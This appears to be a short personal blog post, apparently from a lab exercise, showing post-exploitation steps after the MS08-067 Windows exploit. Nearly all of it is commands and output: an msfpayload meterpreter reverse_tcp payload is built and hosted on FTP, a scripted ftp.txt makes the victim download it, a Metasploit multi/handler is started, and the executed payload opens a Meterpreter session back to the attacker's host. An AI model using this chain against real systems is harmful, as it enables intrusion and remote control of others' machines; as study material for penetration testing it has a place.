---
published: true
layout: post
title: Meterpreter up and running post exploitation
---



I've exploited MS08-067 without metasploit.  After exploitation I use metasploit's meterpreter.  

**Attacker**:  Start the ftp service on my attacking machine

    service pure-ftpd start

**Attacker**:  Create a payload to connect back to my attacking machine's listening meterpreter and save it to my ftp directory

    msfpayload windows/meterpreter/reverse_tcp lhost=192.168.30.36 lport=443 X > /ftphome/iambad.exe
    
**Victim**:  Exploit MS08-067 refer to 

http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/

**Victim**:  FTP is installed on the server.  FTP is not interactive, so create a text file to pass to the ftp application.  I issue the following commands:

    echo open 192.168.30.36> ftp.txt
    echo your_username>> ftp.txt
    echo your_password>> ftp.txt
    echo binary>> ftp.txt
    echo get iambad.exe>> ftp.txt
    echo bye>> ftp.txt

**Victim**:  Execute the ftp command passing the ftp.txt as a parameter

    ftp -s:ftp.txt

**Attacker**:  Start msfconsole on attacking machine

    msfconsole
    
**Attacker**:  Start multi/handler, set LHOST, set LPORT, and start handler

    msf > use exploit/multi/handler
    msf exploit(handler) > set LHOST 192.168.30.36
    msf exploit(handler) > set LPORT 443
    msf exploit(handler) > run
    [*] Started reverse handler on 192.168.30.36:443 
    [*] Starting the payload handler...
    
**Victim**:  Execute payload

    iambad.exe

**Attacker**:  Meterpreter session obtained

    [*] Sending stage (770048 bytes) to 192.168.31.205
    [*] Meterpreter session 1 opened (192.168.30.36:443 -> 192.168.31.205:2707) at 2015-06-05 08:06:04 -0400
